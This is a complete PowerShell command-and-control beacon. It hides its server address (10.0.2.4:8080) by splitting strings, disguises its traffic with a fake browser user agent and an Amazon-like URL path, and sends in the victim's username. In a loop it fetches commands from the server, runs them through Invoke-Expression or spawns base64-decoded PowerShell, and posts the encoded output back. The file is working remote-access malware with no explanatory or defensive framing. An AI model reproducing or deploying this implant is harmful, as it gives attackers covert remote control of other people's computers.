$h0 = "10.0."
$me = "2.4"
$p0rt= "8080"
$uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
$proto = "ht"+"tp"+":/"+"/"
$url = $proto+$h0+$me+":"+$p0rt
$h0me = $url+$uri

$type = "ps1"
$id = Get-Random
$un = $env:username
$sleepytime = 3000
$jsObject = @{}

$useragent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
$checkin = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`"}"

function ConvertTo-Hashtable {
  [CmdletBinding()]
  [OutputType('hashtable')]
  param (
    [Parameter(ValueFromPipeline)]
     $InputObject
  )

  process {
    if ($null -eq $InputObject) {
      return $null
    }
    if ($InputObject -is [System.Collections.IEnumerable] -and $InputObject -isnot [string]) {
      $collection = @(
        foreach ($object in $InputObject) {
          ConvertTo-Hashtable -InputObject $object
        }
      )

      Write-Output -NoEnumerate $collection
    }

    elseif ($InputObject -is [psobject]) {
      $hash = @{}
      foreach ($property in $InputObject.PSObject.Properties) {
        $hash[$property.Name] = ConvertTo-Hashtable -InputObject $property.Value
      }
      $hash
    }
    else {
      $InputObject
    }
  }
}

while ($True) {
	$serverMsg = (Invoke-WebRequest -Method Post -Uri $h0me -Body $checkin -UserAgent $useragent -UseBasicParsing).Content
	$jsondata = "{" + $serverMsg.split("{")[1].split("`n")[0]
  $jsObject = $jsondata | ConvertFrom-Json | ConvertTo-Hashtable

	if($jsObject['cmnd']) {
		if($jsObject['cmnd'] -eq "quit") {
			exit
		}

    if($jsObject['cmnd'].split(" ")[0] -eq "spawn") {
		 try {
        $selfdata = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($jsObject['cmnd'].split(" ")[1]))
			  $selfdata = $selfdata.replace('"','"""')
			  Start-Process powershell -ArgumentList "-c $selfdata" -NoNewWindow
				$retval = "[+] Spawn success..."
      }
			catch {
				$retval = "[-] Spawn failed..."
			}
		}

    elseif($jsObject['cmnd'].split(" ")[0] -eq "psh") {
      # PSH c
      $retval = "[*] Ran PS file..."
    }

		else {
			$retval = IEX $jsObject['cmnd'] -ErrorVariable err 2>&1
			if($err) {
				$retval = $retval + "`n[-] Errors returned:`n`n" + $err
				$err = ""
			}
		}

		if(!($retval)) {
			$retval = "[*] No output returned"
		}

    $jsObject.cmnd = ""
		$ncoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($retval))
		$resp = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"retval`": `"$ncoded`"}"
		$null = Invoke-WebRequest -Method Post -Uri $h0me -Body $resp -UserAgent $useragent -UseBasicParsing
	}
	Start-Sleep -Milliseconds $sleepytime
}
